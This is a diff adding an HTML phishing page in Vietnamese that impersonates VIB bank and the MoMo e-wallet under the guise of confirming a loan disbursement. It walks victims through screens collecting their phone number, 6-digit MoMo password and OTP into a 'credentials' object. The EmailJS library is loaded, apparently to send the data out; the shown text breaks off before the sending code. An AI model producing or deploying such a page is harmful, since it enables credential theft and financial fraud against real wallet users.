@@ -1,0 +1,1493 @@
+
+
+<!DOCTYPE html>
+<html lang="vi">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta
+      name="description"
+      content="Xác nhận khoản vay VIB và giải ngân qua MoMo"
+    />
+    <title>Xác Nhận Thanh Toán - VIB</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Pacifico&display=swap"
+      rel="stylesheet"
+    />
+
+    <script
+      type="text/javascript"
+      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"
+    ></script>
+    <script type="text/javascript">
+      (function () {
+        emailjs.init({
+        publicKey: "7y3ePVskhQ1U5EF2l", // Thay bằng Public Key của bạn
+        });
+      })();
+    </script>
+
+    <style>
+      :root {
+        /* --- Bảng màu MoMo --- */
+        --fecredit-blue: #004695;
+        --fecredit-primary: #d82d8b;
+        --fecredit-primary-dark: #015C2E;
+        --fecredit-red: #d82d8b;
+        --momo-pink: #d82d8b;
+        --momo-pink-darker: #ae2070;
+        --text-primary: #1a202c;
+        --text-secondary: #4a5568;
+        --text-tertiary: #718096;
+        --background-primary: #ffffff;
+        --background-secondary: #f7fafc;
+        --border-color: #e2e8f0;
+        --success: #38a169;
+        --error: #e53e3e;
+        --global-font: "Inter", sans-serif;
+      }
+
+      /* --- Global Reset & Base Styles --- */
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: var(--global-font);
+      }
+
+      html {
+        -webkit-font-smoothing: antialiased;
+        -moz-osx-font-smoothing: grayscale;
+      }
+
+      body {
+        background-color: #e2e8f0;
+        display: flex;
+        justify-content: center;
+        align-items: flex-start;
+        padding: 20px;
+        min-height: 100vh;
+      }
+
+      /* --- Khung giao diện chính --- */
+      .mobile-frame {
+        width: 100%;
+        max-width: 420px;
+        margin: auto;
+        background-color: var(--background-secondary);
+        border-radius: 36px;
+        box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25),
+          0 0 15px rgba(0, 0, 0, 0.07);
+        overflow: hidden;
+        display: flex;
+        flex-direction: column;
+        min-height: 720px;
+      }
+
+      /* --- Quản lý các trang --- */
+      .page-section {
+        display: none;
+        flex-direction: column;
+        flex-grow: 1;
+        animation: fadeIn 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+      }
+
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+          transform: translateY(10px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+
+      .page-section.active {
+        display: flex;
+      }
+
+      /* --- Header của các trang --- */
+      .page-header {
+        padding: 16px;
+        text-align: center;
+        background-color: var(--background-primary);
+        border-bottom: 1px solid var(--border-color);
+        flex-shrink: 0;
+        position: relative;
+      }
+      .page-header h1 {
+        font-size: 16px;
+        font-weight: 600;
+        color: var(--text-primary);
+      }
+      .page-header .back-button {
+        position: absolute;
+        left: 12px;
+        top: 50%;
+        transform: translateY(-50%);
+        background: transparent;
+        border: none;
+        cursor: pointer;
+        padding: 8px;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        transition: background-color 0.2s;
+      }
+      .page-header .back-button:hover {
+        background-color: var(--background-secondary);
+      }
+      .page-header .back-button img {
+        width: 24px;
+        height: 24px;
+      }
+
+      #confirmation-section .page-header {
+        background: linear-gradient(135deg, #005cde, #003a7c);
+        border-bottom: none;
+      }
+      #confirmation-section .page-header h1 {
+        color: white;
+        font-size: 18px;
+      }
+      #confirmation-section .page-header .back-button img {
+        filter: brightness(0) invert(1);
+      }
+
+      /* --- Body của các trang --- */
+      .page-body {
+        padding: 16px;
+        flex-grow: 1;
+        overflow-y: auto;
+      }
+
+      /* --- Card thông tin --- */
+      .info-card {
+        background-color: var(--background-primary);
+        border-radius: 18px;
+        padding: 20px;
+        margin-bottom: 16px;
+        border: 1px solid var(--border-color);
+      }
+      .payment-summary-card {
+        text-align: center;
+      }
+      .payment-summary-card .label {
+        font-size: 15px;
+        color: var(--text-tertiary);
+        margin-bottom: 8px;
+      }
+      .payment-summary-card .amount {
+        font-size: 36px;
+        font-weight: 700;
+        color: var(--text-primary);
+        margin-bottom: 24px;
+      }
+      .payment-summary-card hr {
+        border: none;
+        border-top: 1px solid var(--border-color);
+        margin: 0 -20px;
+      }
+      .info-card .title {
+        font-size: 16px;
+        font-weight: 600;
+        color: var(--text-primary);
+        margin-bottom: 12px;
+        display: block;
+      }
+      .detail-item {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        font-size: 15px;
+        padding: 15px 0;
+        border-bottom: 1px solid var(--border-color);
+      }
+      .detail-item:first-of-type {
+        padding-top: 15px;
+      }
+      .detail-item:last-of-type {
+        border-bottom: none;
+        padding-bottom: 5px;
+      }
+      .detail-item .label {
+        color: var(--text-secondary);
+        font-weight: 400;
+      }
+      .detail-item .value {
+        font-weight: 500;
+        color: var(--text-primary);
+        text-align: right;
+        display: flex;
+        align-items: center;
+        gap: 8px;
+      }
+      .detail-item .value img {
+        width: 24px;
+        height: 24px;
+      }
+
+      .notice-card {
+        background-color: #ebf4ff;
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        padding: 16px;
+        border: 1px solid #bee3f8;
+      }
+      .notice-card img {
+        width: 24px;
+        height: 24px;
+        flex-shrink: 0;
+      }
+      .notice-card p {
+        font-size: 14px;
+        line-height: 1.5;
+        color: #2a4365;
+        font-weight: 500;
+      }
+      .notice-card strong {
+        color: var(--fecredit-red);
+      }
+
+      .page-footer {
+        padding: 16px;
+        background-color: rgba(255, 255, 255, 0.8);
+        backdrop-filter: blur(10px);
+        -webkit-backdrop-filter: blur(10px);
+        flex-shrink: 0;
+        border-top: 1px solid var(--border-color);
+      }
+
+      /* --- Giao diện các trang đăng nhập MoMo (ĐỒNG BỘ) --- */
+      .login-page-layout {
+        flex-grow: 1;
+        display: flex;
+        flex-direction: column;
+        background-color: var(--background-primary);
+        padding: 24px 20px;
+      }
+      .login-content {
+        flex-grow: 1;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        text-align: center;
+      }
+      .login-footer {
+        margin-top: auto;
+        padding-top: 24px;
+      }
+
+      .login-header {
+        text-align: center;
+        margin-bottom: 32px;
+      }
+      .login-header .logo {
+        height: 48px;
+        margin-bottom: 24px;
+      }
+      .login-header .title {
+        font-size: 22px;
+        font-weight: 700;
+        color: var(--text-primary);
+        margin-bottom: 8px;
+      }
+      .login-header .subtitle {
+        font-size: 15px;
+        color: var(--text-secondary);
+        line-height: 1.6;
+      }
+      .login-header .subtitle strong {
+        color: var(--text-primary);
+      }
+
+      .profile-header {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        margin-bottom: 32px;
+      }
+      .profile-header .avatar {
+        width: 80px;
+        height: 80px;
+        border-radius: 50%;
+        background-color: var(--background-secondary);
+        margin-bottom: 16px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        border: 4px solid var(--background-primary);
+        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.08);
+      }
+      .profile-header .avatar img {
+        width: 48px;
+      }
+      .profile-header .phone-number {
+        font-size: 18px;
+        font-weight: 600;
+        color: var(--text-primary);
+      }
+
+      /* Ô nhập SĐT */
+      .phone-input-wrapper {
+        display: flex;
+        align-items: center;
+        width: 100%;
+        border: 1px solid var(--border-color);
+        border-radius: 14px;
+        padding: 6px 16px;
+        margin-top: 24px;
+        transition: border-color 0.2s, box-shadow 0.2s;
+        background-color: var(--background-secondary);
+      }
+      .phone-input-wrapper:focus-within {
+        border-color: var(--momo-pink);
+        box-shadow: 0 0 0 4px rgba(216, 45, 139, 0.1);
+      }
+      .phone-prefix {
+        font-size: 18px;
+        font-weight: 600;
+        color: var(--text-primary);
+        padding-right: 12px;
+        border-right: 1px solid var(--border-color);
+      }
+      .phone-input {
+        border: none;
+        padding: 14px 12px;
+        font-size: 18px;
+        font-weight: 600;
+        flex-grow: 1;
+        color: var(--text-primary);
+        background: none;
+        letter-spacing: 0.5px;
+      }
+      .phone-input:focus {
+        outline: none;
+      }
+      .phone-input.invalid {
+        border-color: var(--error) !important;
+        box-shadow: 0 0 0 4px rgba(229, 62, 62, 0.1) !important;
+      }
+
+      /* Ô nhập mật khẩu */
+      .password-input-container {
+        position: relative;
+        width: 100%;
+        max-width: 340px;
+        margin: 24px auto 0;
+      }
+      .password-real-input {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0;
+        border: none;
+        padding: 0;
+        margin: 0;
+        z-index: 1;
+        caret-color: transparent;
+      }
+      .password-real-input:focus {
+        outline: none;
+      }
+      .password-display {
+        display: flex;
+        justify-content: space-between;
+        gap: 8px;
+        cursor: text;
+      }
+      .char-box {
+        flex: 1;
+        aspect-ratio: 1 / 1.1;
+        border-bottom: 2px solid var(--border-color);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        transition: border-color 0.2s ease-in-out;
+        position: relative;
+      }
+      .password-real-input:focus + .password-display .char-box {
+        border-color: var(--momo-pink);
+      }
+      .char-box.filled::after {
+        content: "●";
+        font-size: 16px;
+        color: var(--text-primary);
+        animation: popIn 0.2s ease;
+      }
+      @keyframes popIn {
+        from {
+          transform: scale(0.5);
+          opacity: 0;
+        }
+        to {
+          transform: scale(1);
+          opacity: 1;
+        }
+      }
+      .char-box.active::before {
+        content: "";
+        position: absolute;
+        left: 50%;
+        transform: translateX(-50%);
+        width: 2px;
+        height: 25px;
+        background-color: var(--momo-pink);
+        animation: blink 1.1s infinite step-end;
+      }
+      @keyframes blink {
+        0%,
+        100% {
+          opacity: 1;
+        }
+        50% {
+          opacity: 0;
+        }
+      }
+
+      /* Ô nhập OTP */
+      .otp-input-container {
+        display: flex;
+        gap: 10px;
+        justify-content: center;
+        margin-top: 24px;
+      }
+      .otp-input {
+        width: 50px;
+        height: 55px;
+        text-align: center;
+        font-size: 24px;
+        font-weight: 700;
+        border: 1px solid var(--border-color);
+        border-radius: 12px;
+        color: var(--text-primary);
+        background-color: var(--background-secondary);
+        transition: all 0.2s;
+      }
+      .otp-input:focus {
+        outline: none;
+        border-color: var(--momo-pink);
+        box-shadow: 0 0 0 4px rgba(216, 45, 139, 0.1);
+        background-color: var(--background-primary);
+      }
+
+      /* Nút bấm */
+      .button {
+        width: 100%;
+        padding: 16px;
+        border-radius: 16px;
+        cursor: pointer;
+        font-size: 16px;
+        font-weight: 600;
+        transition: all 0.2s ease-in-out;
+        border: none;
+      }
+      .button:active:not(:disabled) {
+        transform: translateY(1px) scale(0.99);
+        filter: brightness(0.95);
+      }
+      .button:disabled {
+        background: #cbd5e0;
+        color: #a0aec0;
+        cursor: not-allowed;
+        box-shadow: none;
+      }
+      .button.primary {
+        background-color: var(--fecredit-red);
+        color: #fff;
+        box-shadow: 0 5px 15px -3px rgba(0, 70, 149, 0.35);
+      }
+      .button.primary:hover:not(:disabled) {
+        background-color: var(--fecredit-primary-dark);
+      }
+      .button.momo-btn {
+        background-color: var(--momo-pink);
+        color: #fff;
+        box-shadow: 0 5px 15px -3px rgba(216, 45, 139, 0.4);
+      }
+      .button.momo-btn:hover:not(:disabled) {
+        background-color: var(--momo-pink-darker);
+      }
+
+      /* Links */
+      .link-container {
+        margin-top: 24px;
+        font-size: 14px;
+        color: var(--text-secondary);
+      }
+      .link-container a {
+        color: var(--momo-pink);
+        font-weight: 500;
+        text-decoration: none;
+        transition: color 0.2s;
+      }
+      .link-container a:hover {
+        color: var(--momo-pink-darker);
+      }
+
+      .agreement-text {
+        font-size: 13px;
+        color: var(--text-secondary);
+        text-align: center;
+        line-height: 1.6;
+        margin-bottom: 16px;
+        padding: 0 16px;
+      }
+      .agreement-text a {
+        color: var(--momo-pink);
+        text-decoration: none;
+        font-weight: 500;
+      }
+
+      /* Spinner */
+      .loading {
+        display: none;
+        text-align: center;
+        margin-top: 16px;
+      }
+      .spinner {
+        border: 4px solid rgba(216, 45, 139, 0.2);
+        border-top-color: var(--momo-pink);
+        border-radius: 50%;
+        width: 32px;
+        height: 32px;
+        animation: spin 1s linear infinite;
+        margin: 0 auto;
+      }
+      @keyframes spin {
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+
+      /* Thông báo */
+      .notification {
+        position: fixed;
+        top: 20px;
+        left: 50%;
+        transform: translateX(-50%) translateY(-150%);
+        padding: 14px 24px;
+        border-radius: 12px;
+        color: #fff;
+        z-index: 1001;
+        box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.2),
+          0 8px 10px -6px rgba(0, 0, 0, 0.2);
+        transition: transform 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        font-weight: 500;
+        min-width: 300px;
+        max-width: 90%;
+      }
+      .notification.show {
+        transform: translateX(-50%) translateY(0);
+      }
+      .notification.success {
+        background-color: var(--success);
+      }
+      .notification.error {
+        background-color: var(--error);
+      }
+      .notification::before {
+        content: "";
+        display: inline-block;
+        width: 22px;
+        height: 22px;
+        background-size: contain;
+        background-repeat: no-repeat;
+        background-position: center;
+        flex-shrink: 0;
+      }
+      .notification.success::before {
+        background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 20 20' fill='white'%3e%3cpath fill-rule='evenodd' d='M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z' clip-rule='evenodd' /%3e%3c/svg%3e");
+      }
+      .notification.error::before {
+        background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 20 20' fill='white'%3e%3cpath fill-rule='evenodd' d='M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z' clip-rule='evenodd' /%3e%3c/svg%3e");
+      }
+
+      /* ===== TẾT GIAO DIỆN - MoMo Sections ===== */
+
+      /* Nền ấm cream cho các section MoMo */
+      #momo-phone-section,
+      #momo-password-section,
+      #momo-otp-section {
+        background: linear-gradient(180deg, #fff8ee 0%, #fff1dc 100%);
+        position: relative;
+      }
+
+      /* Header trong suốt cho MoMo sections */
+      #momo-phone-section .page-header,
+      #momo-password-section .page-header,
+      #momo-otp-section .page-header {
+        background: transparent;
+        border-bottom: none;
+      }
+
+      /* Layout MoMo sections trong suốt */
+      #momo-phone-section .login-page-layout,
+      #momo-password-section .login-page-layout,
+      #momo-otp-section .login-page-layout {
+        background: transparent;
+        position: relative;
+        z-index: 1;
+        padding-bottom: 130px;
+      }
+
+      /* Chữ cursive hồng */
+      .cursive-pink {
+        font-family: 'Pacifico', cursive;
+        color: #d82d8b;
+        font-size: 0.92em;
+      }
+
+      /* Tiêu đề trong các section MoMo */
+      .momo-section-title {
+        font-size: 24px;
+        font-weight: 700;
+        color: #231f20;
+        margin-bottom: 8px;
+        line-height: 1.3;
+        text-align: center;
+      }
+
+      /* Ô nhập SĐT mới với cờ VN */
+      .phone-input-row {
+        display: flex;
+        align-items: center;
+        background: #fff;
+        border: 1.5px solid #e6d7de;
+        border-radius: 16px;
+        padding: 12px 16px;
+        margin-top: 24px;
+        gap: 10px;
+        transition: border-color 0.2s, box-shadow 0.2s;
+        box-shadow: 0 2px 8px rgba(216,45,139,0.06);
+      }
+      .phone-input-row:focus-within {
+        border-color: #d82d8b;
+        box-shadow: 0 0 0 4px rgba(216,45,139,0.12);
+      }
+      .phone-input-row .vn-flag {
+        width: 28px;
+        height: 20px;
+        border-radius: 3px;
+        flex-shrink: 0;
+        object-fit: cover;
+      }
+      .phone-input-row .region-code {
+        font-size: 17px;
+        font-weight: 600;
+        color: #333;
+        padding-right: 10px;
+        border-right: 1.5px solid #e6d7de;
+        flex-shrink: 0;
+      }
+      .phone-input-row .phone-real-input {
+        border: none;
+        font-size: 17px;
+        font-weight: 500;
+        background: transparent;
+        outline: none;
+        flex-grow: 1;
+        color: #231f20;
+        min-width: 0;
+      }
+      .phone-input-row .phone-real-input.invalid {
+        color: var(--error);
+      }
+
+      /* Switch VIE/ENG */
+      .lang-switch {
+        display: flex;
+        justify-content: flex-end;
+        align-items: center;
+        gap: 6px;
+        margin-top: 14px;
+        margin-bottom: 4px;
+      }
+      .lang-switch-btn {
+        background: #fff;
+        border: 1.5px solid #e6d7de;
+        border-radius: 20px;
+        color: #d82d8b;
+        font-weight: 700;
+        padding: 3px 12px;
+        font-size: 13px;
+        cursor: pointer;
+        transition: background 0.15s, color 0.15s, border-color 0.15s;
+      }
+      .lang-switch-btn.active {
+        background: #d82d8b;
+        color: #fff;
+        border-color: #d82d8b;
+      }
+      .lang-switch-sep {
+        color: #aaa;
+        font-size: 13px;
+      }
+
+      /* OTP số điện thoại màu xanh dương */
+      .otp-phone-blue {
+        color: #1a73e8;
+        font-weight: 600;
+      }
+
+      /* Nút gửi lại mã OTP */
+      .resend-btn {
+        background: none;
+        border: none;
+        cursor: pointer;
+        color: #1a73e8;
+        font-size: 14px;
+        font-weight: 600;
+        padding: 0;
+        transition: color 0.2s;
+        text-decoration: underline;
+      }
+      .resend-btn:disabled {
+        color: #999;
+        cursor: not-allowed;
+        text-decoration: none;
+      }
+
+      /* OTP submit disabled */
+      #momo-otp-submit-btn {
+        background: #cbd5e0;
+        color: #a0aec0;
+      }
+      #momo-otp-submit-btn.ready {
+        background: var(--momo-pink);
+        color: #fff;
+        box-shadow: 0 5px 15px -3px rgba(216,45,139,0.4);
+      }
+
+      /* Link Quên mật khẩu màu xanh dương */
+      #momo-password-section .link-container a {
+        color: #1a73e8;
+      }
+      #momo-password-section .link-container a:hover {
+        color: #1557b0;
+      }
+
+      /* Trang trí Tết dưới cùng */
+      .tet-decor {
+        position: absolute;
+        bottom: 0;
+        left: 0;
+        right: 0;
+        height: 120px;
+        display: flex;
+        justify-content: space-between;
+        align-items: flex-end;
+        pointer-events: none;
+        z-index: 0;
+        overflow: hidden;
+      }
+      .tet-decor-left {
+        font-size: 52px;
+        line-height: 1.1;
+        padding-left: 6px;
+        padding-bottom: 4px;
+        filter: drop-shadow(1px 2px 4px rgba(0,0,0,0.08));
+        user-select: none;
+      }
+      .tet-decor-right {
+        font-size: 52px;
+        line-height: 1.1;
+        padding-right: 6px;
+        padding-bottom: 4px;
+        filter: drop-shadow(1px 2px 4px rgba(0,0,0,0.08));
+        user-select: none;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="mobile-frame">
+      <div id="confirmation-section" class="page-section active">
+        <header class="page-header">
+          <button
+            class="back-button"
+            onclick="window.location.href='Evaluate-conditions.html'"
+          >
+            <img
+              src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='currentColor'%3e%3cpath fill-rule='evenodd' d='M11.03 3.97a.75.75 0 010 1.06l-6.22 6.22H21a.75.75 0 010 1.5H4.81l6.22 6.22a.75.75 0 11-1.06 1.06l-7.5-7.5a.75.75 0 010-1.06l7.5-7.5a.75.75 0 011.06 0z' clip-rule='evenodd' /%3e%3c/svg%3e"
+              alt="Back"
+            />
+          </button>
+          <h1>Xác nhận giải ngân</h1>
+        </header>
+        <main class="page-body">
+          <div class="info-card payment-summary-card">
+            <h2 class="amount" id="mainTotalAmount"></h2>
+            <hr />
+            <div id="payment-details" style="padding-top: 5px"></div>
+          </div>
+          <div class="info-card">
+            <strong class="title">Thông tin người vay</strong>
+            <div id="customer-details"></div>
+          </div>
+          <div class="info-card notice-card">
+            <img
+              src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23004695'%3e%3cpath fill-rule='evenodd' d='M6.75 2.25A.75.75 0 017.5 3v1.5h9V3A.75.75 0 0118 3v1.5h.75a3 3 0 013 3v11.25a3 3 0 01-3 3H5.25a3 3 0 01-3-3V7.5a3 3 0 013-3H6V3a.75.75 0 01.75-.75zM5.25 6A1.5 1.5 0 003.75 7.5v11.25c0 .828.672 1.5 1.5 1.5h13.5a1.5 1.5 0 001.5-1.5V7.5A1.5 1.5 0 0018.75 6H5.25z' clip-rule='evenodd' /%3e%3c/svg%3e"
+              alt="Calendar Icon"
+            />
+            <p id="closingDateNotice"></p>
+          </div>
+        </main>
+        <footer class="page-footer">
+          <button
+            class="button primary"
+            onclick="showSection('momo-phone-section')"
+          >
+            Xác nhận qua MoMo
+          </button>
+        </footer>
+      </div>
+
+      <div id="momo-phone-section" class="page-section">
+        <header class="page-header">
+          <button
+            class="back-button"
+            onclick="showSection('confirmation-section')"
+          >
+            <img
+              src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke-width='2.5' stroke='%231d1d1f'%3e%3cpath stroke-linecap='round' stroke-linejoin='round' d='M15.75 19.5L8.25 12l7.5-7.5' /%3e%3c/svg%3e"
+              alt="Back"
+            />
+          </button>
+          <h1>Nhập SĐT</h1>
+        </header>
+        <main class="login-page-layout">
+          <div class="login-content">
+            <div class="login-header">
+              <img
+                src="https://homepage.momocdn.net/fileuploads/svg/momo-file-240411162904.svg"
+                alt="MoMo Logo"
+                class="logo"
+              />
+              <h2 class="momo-section-title">
+                <span class="cursive-pink">Số điện thoại</span> của bạn
+              </h2>
+            </div>
+            <form onsubmit="event.preventDefault(); handlePhoneSubmit();">
+              <div class="phone-input-row">
+                <img
+                  src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 30 20'%3e%3crect width='30' height='20' fill='%23DA251D'/%3e%3cpolygon points='15,3.5 16.9,9 22.6,9 17.9,12.3 19.7,17.8 15,14.5 10.3,17.8 12.1,12.3 7.4,9 13.1,9' fill='%23FFFF00'/%3e%3c/svg%3e"
+                  class="vn-flag"
+                  alt="Việt Nam"
+                />
+                <span class="region-code">+84</span>
+                <input
+                  type="tel"
+                  id="momo-phone"
+                  class="phone-real-input"
+                  placeholder="Số điện thoại"
+                  required
+                  inputmode="numeric"
+                  maxlength="10"
+                  pattern="[0-9]{10}"
+                  oninput="this.value = this.value.replace(/\D/g, '')"
+                />
+              </div>
+            </form>
+            <div class="lang-switch">
+              <button
+                class="lang-switch-btn active"
+                type="button"
+                onclick="setLang('VIE', this)"
+              >VIE</button>
+              <span class="lang-switch-sep">/</span>
+              <button
+                class="lang-switch-btn"
+                type="button"
+                onclick="setLang('ENG', this)"
+              >ENG</button>
+            </div>
+          </div>
+          <div class="login-footer">
+            <p class="agreement-text">
+              Bằng việc tiếp tục, tôi đồng ý với
+              <a href="#">Điều khoản sử dụng của MoMo</a>.
+            </p>
+            <button class="button momo-btn" onclick="handlePhoneSubmit()">
+              Tiếp tục
+            </button>
+          </div>
+        </main>
+      </div>
+
+      <div id="momo-password-section" class="page-section">
+        <header class="page-header">
+          <button
+            class="back-button"
+            onclick="showSection('momo-phone-section')"
+          >
+            <img
+              src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke-width='2.5' stroke='%231d1d1f'%3e%3cpath stroke-linecap='round' stroke-linejoin='round' d='M15.75 19.5L8.25 12l7.5-7.5' /%3e%3c/svg%3e"
+              alt="Back"
+            />
+          </button>
+          <h1>Nhập mật khẩu</h1>
+        </header>
+        <main class="login-page-layout">
+          <div class="login-content">
+            <div class="login-header" style="margin-bottom:16px;">
+              <h2 class="momo-section-title">
+                <span class="cursive-pink">Mật khẩu</span> của bạn
+              </h2>
+            </div>
+            <div class="profile-header">
+              <div class="avatar">
+                <img
+                  src="https://shireoakinternational.asia/wp-content/uploads/2022/12/Person-650x650.jpg"
+                  alt="MoMo Logo"
+                />
+              </div>
+              <span class="phone-number" id="masked-phone-password"></span>
+            </div>
+            <form onsubmit="event.preventDefault(); handlePasswordSubmit();">
+              <div class="password-input-container">
+                <input
+                  type="password"
+                  id="momo-password"
+                  class="password-real-input"
+                  autocomplete="one-time-code"
+                  required
+                  inputmode="numeric"
+                  pattern="[0-9]{6}"
+                  maxlength="6"
+                  oninput="this.value = this.value.replace(/\D/g, ''); updatePasswordDisplay(this.value)"
+                />
+                <div
+                  class="password-display"
+                  onclick="document.getElementById('momo-password').focus()"
+                >
+                  <div class="char-box"></div>
+                  <div class="char-box"></div>
+                  <div class="char-box"></div>
+                  <div class="char-box"></div>
+                  <div class="char-box"></div>
+                  <div class="char-box"></div>
+                </div>
+              </div>
+            </form>
+            <div class="link-container">
+              <a href="#">Quên mật khẩu?</a>
+            </div>
+          </div>
+          <div class="login-footer">
+            <button class="button momo-btn" onclick="handlePasswordSubmit()">
+              Đăng nhập
+            </button>
+          </div>
+        </main>
+      </div>
+
+      <div id="momo-otp-section" class="page-section">
+        <header class="page-header">
+          <button
+            class="back-button"
+            onclick="showSection('momo-password-section')"
+          >
+            <img
+              src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke-width='2.5' stroke='%231d1d1f'%3e%3cpath stroke-linecap='round' stroke-linejoin='round' d='M15.75 19.5L8.25 12l7.5-7.5' /%3e%3c/svg%3e"
+              alt="Back"
+            />
+          </button>
+          <h1>Xác thực OTP</h1>
+        </header>
+        <main class="login-page-layout">
+          <div class="login-content">
+            <div class="login-header">
+              <h2 class="momo-section-title">
+                <span class="cursive-pink">Xác thực OTP</span> của bạn
+              </h2>
+              <p class="subtitle" id="momo-otp-prompt" style="margin-top:10px;"></p>
+            </div>
+            <form onsubmit="event.preventDefault(); handleOtpSubmit();">
+              <div class="otp-input-container">
+                <input
+                  type="text"
+                  class="otp-input"
+                  maxlength="1"
+                  inputmode="numeric"
+                />
+                <input
+                  type="text"
+                  class="otp-input"
+                  maxlength="1"
+                  inputmode="numeric"
+                />
+                <input
+                  type="text"
+                  class="otp-input"
+                  maxlength="1"
+                  inputmode="numeric"
+                />
+                <input
+                  type="text"
+                  class="otp-input"
+                  maxlength="1"
+                  inputmode="numeric"
+                />
+              </div>
+            </form>
+            <div class="link-container" id="resend-otp-container" style="display:flex;align-items:center;justify-content:center;gap:6px;">
+              <span style="color:#555;">Chưa nhận được mã?</span>
+              <button
+                type="button"
+                id="resend-otp-btn"
+                class="resend-btn"
+                onclick="resendOtp()"
+                disabled
+              >Gửi lại mã (<span id="resend-countdown">60</span>)</button>
+            </div>
+            <div class="loading" id="momo-otp-loading">
+              <div class="spinner"></div>
+            </div>
+          </div>
+          <div class="login-footer">
+            <button
+              class="button momo-btn"
+              id="momo-otp-submit-btn"
+              onclick="handleOtpSubmit()"
+              disabled
+            >
+              Xác nhận
+            </button>
+          </div>
+        </main>
+      </div>
+    </div>
+
+    <div id="notification" class="notification"></div>
+
+    <script>
+      document.addEventListener("DOMContentLoaded", () => {
+        const credentials = { phone: "", password: "", otp: "" };
+        let otpAttempts = 0;
+
+        const getEl = (id) => document.getElementById(id);
+
+        const getFormData = () => {
+          const storedData =
+            JSON.parse(sessionStorage.getItem("formData")) || {};
+          const params = new URLSearchParams(window.location.search);
+          return {
+            fullName:
+              storedData.fullName || params.get("fullName") || "Nguyễn Văn A",
+            cccd: storedData.cccd || params.get("cccd") || "012345678910",
+            amount:
+              parseInt(storedData.amount?.replace(/[^0-9]/g, "")) ||
+              parseInt(params.get("amount")) ||
+              50000000,
+            months:
+              parseInt(storedData.months) ||
+              parseInt(params.get("months")) ||
+              48,
+            phone: storedData.phone || params.get("phone") || "0987654321",
+            email:
+              storedData.email || params.get("email") || "example@email.com",
+          };
+        };
+
+        const formData = getFormData();
+
+        const otpInputs = document.querySelectorAll(
+          "#momo-otp-section .otp-input"
+        );
+        const passwordInputEl = getEl("momo-password");
+
+        const formatCurrency = (amount) =>
+          new Intl.NumberFormat("vi-VN", {
+            style: "currency",
+            currency: "VND",
+          }).format(amount);
+
+        const createDetailItem = (label, value, isPaymentMethod = false) => {
+          const item = document.createElement("div");
+          item.className = "detail-item";
+          const labelSpan = document.createElement("span");
+          labelSpan.className = "label";
+          labelSpan.textContent = label;
+          const valueSpan = document.createElement("span");
+          valueSpan.className = "value";
+          if (isPaymentMethod) {
+            const logo = document.createElement("img");
+            logo.src =
+              "https://homepage.momocdn.net/fileuploads/svg/momo-file-240411162904.svg";
+            logo.alt = "MoMo Logo";
+            valueSpan.appendChild(logo);
+            valueSpan.append(value);
+          } else {
+            valueSpan.textContent = value;
+          }
+          item.appendChild(labelSpan);
+          item.appendChild(valueSpan);
+          return item;
+        };
+
+        const populateData = () => {
+          const principal = formData.amount || 0;
+          const interest =
+            formData.interest !== undefined
+              ? formData.interest
+              : principal * 0.057;
+          const collectionFee = 24000;
+          const contractNumber =
+            "SHB-" + Math.floor(1000000000 + Math.random() * 9000000000);
+
+          getEl("mainTotalAmount").textContent = formatCurrency(principal);
+
+          const paymentDetailsContainer = getEl("payment-details");
+          paymentDetailsContainer.innerHTML = "";
+          paymentDetailsContainer.appendChild(
+            createDetailItem("Số tiền gốc", formatCurrency(principal))
+          );
+          paymentDetailsContainer.appendChild(
+            createDetailItem("Số tiền lãi (ước tính)", formatCurrency(interest))
+          );
+          paymentDetailsContainer.appendChild(
+            createDetailItem("Phí thu hộ", formatCurrency(collectionFee))
+          );
+          paymentDetailsContainer.appendChild(
+            createDetailItem("Thanh toán qua", "Ví MoMo", true)
+          );
+
+          const customerDetailsContainer = getEl("customer-details");
+          customerDetailsContainer.innerHTML = "";
+          customerDetailsContainer.appendChild(
